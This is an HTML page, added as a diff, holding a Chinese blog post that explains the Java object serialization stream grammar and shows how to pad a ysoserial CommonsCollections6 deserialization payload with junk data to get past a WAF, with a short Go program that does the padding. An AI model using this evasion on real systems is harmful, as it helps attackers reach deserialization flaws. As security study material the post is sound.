@@ -1,0 +1,717 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/Decemberus.github-io/img/fluid.png">
+  <link rel="icon" href="/Decemberus.github-io/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Decemberus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Java反序列化协议构造与分析首先我们需要理解这个Grammer：Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com) 初步理解反序列化12345678910111213141516171819stream:magic version contentsconten">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化协议构造与分析">
+<meta property="og:url" content="https://decemberus.github.io/Decemberus.github-io/2023/03/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="欢迎回来">
+<meta property="og:description" content="Java反序列化协议构造与分析首先我们需要理解这个Grammer：Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com) 初步理解反序列化12345678910111213141516171819stream:magic version contentsconten">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258792.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258276.png">
+<meta property="article:published_time" content="2023-03-19T12:49:47.000Z">
+<meta property="article:modified_time" content="2023-03-19T12:48:34.539Z">
+<meta property="article:author" content="Decemberus">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258792.png">
+  
+  
+  <title>Java反序列化协议构造与分析 - 欢迎回来</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/Decemberus.github-io/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/Decemberus.github-io/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/Decemberus.github-io/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"decemberus.github.io","root":"/Decemberus.github-io/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/Decemberus.github-io/local-search.xml"};
+  </script>
+  <script  src="/Decemberus.github-io/js/utils.js" ></script>
+  <script  src="/Decemberus.github-io/js/color-schema.js" ></script>
+
+  
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/Decemberus.github-io/">
+      <strong>enjoy的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/Decemberus.github-io/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/Decemberus.github-io/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化协议构造与分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-03-19 20:49" pubdate>
+          2023年3月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Java反序列化协议构造与分析</h1>
+            
+            <div class="markdown-body">
+              
+              <h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>首先我们需要理解这个Grammer：<a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html">Java Object Serialization Specification: 6 - Object Serialization Stream Protocol (oracle.com)</a></p>
+<h2 id="初步理解反序列化"><a href="#初步理解反序列化" class="headerlink" title="初步理解反序列化"></a>初步理解反序列化</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java">stream:<br>magic version contents<br>contents:<br>content<br>contents content<br>content:<br>object<br>blockdata<br>object:<br>newObject<br>newClass<br>newArray<br>newString<br>newEnum<br>newClassDesc<br>prevObject<br>nullReference<br>exception<br>TC_RESET<br></code></pre></td></tr></table></figure>
+
+<p>这是一个依次展开的巴科斯范式。我们从第一个stream开始看起，stream就是指完整的序列化协议流，</p>
+<p>它是有三部分组成：magic、version和contents。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_MAGIC = (<span class="hljs-type">short</span>)<span class="hljs-number">0xaced</span>;<br><span class="hljs-keyword">final</span> <span class="hljs-type">static</span> <span class="hljs-type">short</span> STREAM_VERSION = <span class="hljs-number">5</span>;<br></code></pre></td></tr></table></figure>
+
+<p>magic等于0xaced，version等于5，这两个变量都是short类型，也就是两个字节的整型。这也就是为什么我们说序列化协议流是以 \xAC\xED\x00\x05 开头的原因。</p>
+<p>接着， contents 在下面两行定义。可见， contents 等于 content ，或者 contents content 。怎么理解呢？</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">contents:<br>  content<br>  contents content<br></code></pre></td></tr></table></figure>
+
+<p>这里实际上是一个简单的递归下降的规则， contents 可以由一个 content 组成，也可以由一个contents 与一个 content 组成，而后面这种情况里的 contents 又可以继续由这两种情况组成，最后形成编译原理里所谓的左递归。</p>
+<p>我们不用理解这么复杂的内容，因为这个例子非常简单，所以我们很容易地可以理解为： <strong>contents 是有一个或多个content 组成。</strong></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-attribute">content</span>:<br>  <span class="hljs-selector-tag">object</span><br>  blockdata<br></code></pre></td></tr></table></figure>
+
+<p>content又是由object和blockdata组成</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe">object:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Object</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Class</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Array</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">String</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">Enum</span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  prevObject<br>  nullReference<span class="hljs-comment">//表示一个null</span><br>  exception<br>  TC_RESET<span class="hljs-comment">//重置Reference ID</span><br></code></pre></td></tr></table></figure>
+
+<p>要重点区分一下对象<code>newObject</code>,类<code>newClass</code>,类定义<code>newClassDesc</code></p>
+<p>这里对象和类的区别，就是前者是一个类实例化的对象，而后者就是这个类本身</p>
+<p><code>newObject</code>和<code>newClass</code>的Grammer也需好好关注</p>
+<figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">new</span><span class="hljs-type">Class</span>:<br>  TC_CLASS classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span><br><br>classDesc:<span class="hljs-type"></span><br>  <span class="hljs-keyword">new</span><span class="hljs-type">ClassDesc</span><br>  nullReference<br>  (ClassDesc)prevObject      <span class="hljs-comment">// an object required to be of type</span><br>                             <span class="hljs-comment">// ClassDesc</span><br>                             <br><span class="hljs-keyword">new</span><span class="hljs-type">Object</span>:<br>  TC_OBJECT classDesc <span class="hljs-keyword">new</span><span class="hljs-type">Handle</span> classdata[]  <span class="hljs-comment">// data for each class</span><br></code></pre></td></tr></table></figure>
+
+<p>可见， <code>newObject</code> 和 <code>newClass</code> 都是由一个标示符+ <code>classDesc</code> + <code>newHandle</code> 组成，只不过 <code>newObject</code>多一个 <code>classdata[]</code> 。原因是，它是一个对象，其包含了实例化类中的数据，这些数据就储存在<code>classdata[]</code> 中。</p>
+<p><code>classDesc</code> 就是我们前面说的类定义，不过这个 <code>classDesc</code> 和前面的 <code>newClassDesc</code> 稍微有点区别，<code>classDesc</code> 可以是一个普通的 <code>newClassDesc</code> ，也可以是一个null，也可以是一个指针，指向任意前面已经出现过的其他的类定义。我们只要简单把 <code>classDesc</code> 理解为对 <code>newClassDesc</code> 的一个封装即可</p>
+<p><code>newHandle</code> 是一个唯一ID，序列化协议里的每一个结构都拥有一个ID，这个ID由 0x7E0000 开始，每遇到下一个结构就+1，并设置成这个结构的唯一ID。而我前面说的 <code>prevObject</code> 指针，就是通过这个ID来定位它指向的结构。</p>
+<p><strong>TC_的含义</strong></p>
+<blockquote>
+<p>在上面的代码解释中经常能看见TC_开头的一些参数，他主要是Type Code的缩写，表示一个字节标记的类型</p>
+<p>在Java序列化中，数据流是按照块（Object、Array、Primitive Type）进行分割的。每个块都会以特定的标识符（Type Code）开头，用于标识这个块的类型。常见的Type Code包括：</p>
+<ul>
+<li>TC_OBJECT（对象）</li>
+<li>TC_CLASSDESC（类描述符）</li>
+<li>TC_ARRAY（数组）</li>
+<li>TC_STRING（字符串）</li>
+<li>TC_LONGSTRING（长字符串）</li>
+<li>TC_NULL（null值）</li>
+<li>TC_REFERENCE（引用）</li>
+<li>TC_EXCEPTION（异常）</li>
+<li>TC_BLOCKDATA（数据块）</li>
+<li>TC_ENDBLOCKDATA（数据块结束）</li>
+</ul>
+<p>因此，”TC_”前缀可以让序列化器和反序列化器在处理数据流时快速识别块的类型，以便正确地解析数据。</p>
+</blockquote>
+<h2 id="序列化的解析成果"><a href="#序列化的解析成果" class="headerlink" title="序列化的解析成果"></a>序列化的解析成果</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><br><span class="hljs-keyword">import</span> org.apache.commons.codec.binary.Base64;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">protected</span> String name;<br>    <span class="hljs-keyword">protected</span>  User parent;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setParent</span><span class="hljs-params">(User parent)</span><br>    &#123;<br>        <span class="hljs-built_in">this</span>.parent=parent;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">bob</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;bob&quot;</span>);<br>        bob.setParent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;Josa&quot;</span>));<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(bob);<br>        System.out.println(Base64.encodeBase64String(byteArrayOutputStream.toByteArray()));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//输出</span><br>r<span class="hljs-meta">O0</span>ABX<span class="hljs-symbol">NyABd5</span>c<span class="hljs-number">29</span>zZXJpYWwucHJhY<span class="hljs-number">3</span>RpY<span class="hljs-number">2</span>UuVX<span class="hljs-symbol">NlcpHNaOa2</span><span class="hljs-symbol">n6</span><span class="hljs-name">m0</span>AgACTAAEbmFtZXQAEkxqYXZhL<span class="hljs-number">2</span>xhbmcvU<span class="hljs-number">3</span>RyaW<span class="hljs-number">5</span><span class="hljs-symbol">nO0</span>wAB<span class="hljs-symbol">nBhcmVudHQAGUx5</span>c<span class="hljs-number">29</span>zZXJpYWw<span class="hljs-attr">vcHJhY3</span>RpY<span class="hljs-number">2</span>UvVX<span class="hljs-symbol">Nlcjt4</span>cHQAA<span class="hljs-number">2</span>JvY<span class="hljs-symbol">nNxAH4</span>AAHQABEp<span class="hljs-attr">vc2</span>Fw<br></code></pre></td></tr></table></figure>
+
+<p>将得到的Base64的数据流用zkar进行分析</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258792.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230223224253392"> </p>
+<p>可见，这里 contents 只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等。</p>
+<p>这个 classDesc 的ID就是8257536，而在 []classData 数组中，包含两个属性， name 和 parent ，parent 也是一个 newObject ，它实际上在源码中是一个User类对象，所以 classDesc 也是User类的信息，因为前面已经定义过了，所以这个类是一个Reference，ID也是8257536，表示指向前面User类的ClassDesc。</p>
+<p>通过这个简单的案例，我们可以理解Java是怎么序列化一个类的。当然，实际情况会比这个例子要复杂很多，但我们只需要按照Grammer中的语法进行分析，再结合zkar的执行结果，即可很好地理解序列化协议了</p>
+<h2 id="构造包含垃圾的序列化流"><a href="#构造包含垃圾的序列化流" class="headerlink" title="构造包含垃圾的序列化流"></a>构造包含垃圾的序列化流</h2><h3 id="C0ny"><a href="#C0ny" class="headerlink" title="C0ny"></a>C0ny</h3><p>先来看看c0ny师傅的大体思路</p>
+<p>思路是需要找到一个class可以序列化，它可以把我们的脏数据对象和ysoserial gadget对象一起包裹起来。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class A&#123;<br>	<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">10000</span>]&#123;<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12</span>,<span class="hljs-number">12.</span>....&#125;<br>	.....<br>	yso Gadget<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以我们要找的class，第一需要实现java.io.Serializable接口，第二可以存储任意对象。这么看来集合类型就非常符合我们的需求。</p>
+<ol>
+<li><p>ArrayList</p>
+</li>
+<li><p>LinkedList</p>
+</li>
+<li><p>HashMap</p>
+</li>
+</ol>
+<p>…..</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191258276.png" srcset="/Decemberus.github-io/img/loading.gif" lazyload alt="image-20230223230550344"> </p>
+<p>所以我们可以改造ysoserial</p>
+<p>大致的流程调用是，构造函数传入gadget对象以及垃圾数据长度，然后调用doWrap方法随机创建一个集合类型把随机生成的脏数据和gadget对象存储起来，最终序列化该对象即可拿到bypass WAF的序列化数据。具体实现参考<a target="_blank" rel="noopener" href="https://github.com/woodpecker-framework/ysoserial-for-woodpecker">代码和注释</a></p>
+<p>完整的项目看这个</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据 (qq.com)</a></p>
+<h3 id="P"><a href="#P" class="headerlink" title="P"></a>P</h3><p>c0ny师傅的大体思路就是把Gadget和脏数据一起放入一个集合对象中</p>
+<p>但是还有其他的操作</p>
+<p>content是由object和blockdata组成，而blockdata是一个适合用来填充藏</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">content:<br>object<br>blockdata<br><br>blockdata:<br>blockdatashort<br>blockdatalong<br><br>blockdatashort:<br><span class="hljs-built_in">TC_BLOCKDATA</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">byte</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br><br>blockdatalong:<br><span class="hljs-built_in">TC_BLOCKDATALONG</span> (<span class="hljs-type">int</span>)&lt;size&gt; (<span class="hljs-type">byte</span>)[size]<br></code></pre></td></tr></table></figure>
+
+<p>我们选择<code>blockdatalong</code></p>
+<p>我们编写一个简单的Go程序，并调用zkar库中的结构和方法，来构造这个填充了垃圾字符的CommonsCollections6的Payload：</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><span class="hljs-keyword">import</span> (<br>	<span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br>	<span class="hljs-string">&quot;io/ioutil&quot;</span><br>	<span class="hljs-string">&quot;log&quot;</span><br>	<span class="hljs-string">&quot;strings&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;cc6.ser&quot;</span>)<br>	serialization, err := serz.FromBytes(data)<br>	<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>	log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>	&#125;<br>	<span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>	Flag: serz.JAVA_TC_BLOCKDATALONG,<br>	BlockData: &amp;serz.TCBlockData&#123;<br>		Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>	&#125;,<br>	&#125;<br>	serialization.Contents = <span class="hljs-built_in">append</span>(serialization.Contents, blockData)<br>	ioutil.WriteFile(<span class="hljs-string">&quot;cc6-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+              
+            </div>
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化协议构造与分析</div>
+      <div>https://decemberus.github.io/Decemberus.github-io/2023/03/19/Java反序列化协议构造与分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Decemberus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年3月19日</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/Decemberus.github-io/2019/06/03/CC1%E4%B8%8ECC6(1)/" title="CC1&amp;6">
+                        <span class="hidden-mobile">CC1&amp;6</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/Decemberus.github-io/js/events.js" ></script>
+<script  src="/Decemberus.github-io/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
